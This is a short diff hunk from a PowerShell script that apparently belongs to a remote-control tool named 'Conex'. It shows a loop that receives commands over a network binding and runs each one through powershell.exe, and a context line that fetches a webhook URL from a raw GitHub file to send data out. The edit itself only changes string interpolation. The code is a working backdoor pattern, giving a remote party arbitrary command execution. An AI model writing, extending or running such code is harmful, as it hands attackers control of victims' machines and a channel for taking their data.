@@ -52,5 +52,5 @@ Send-Webhook -WebhookUrl ((iwr https://raw.githubusercontent.com/jh1sc/Conex/mai
 while (1) {
     $r = (Receive $BindingIP 0)
     
-    powershell.exe -c "$($r)"
+    powershell.exe -c "$r"
 }
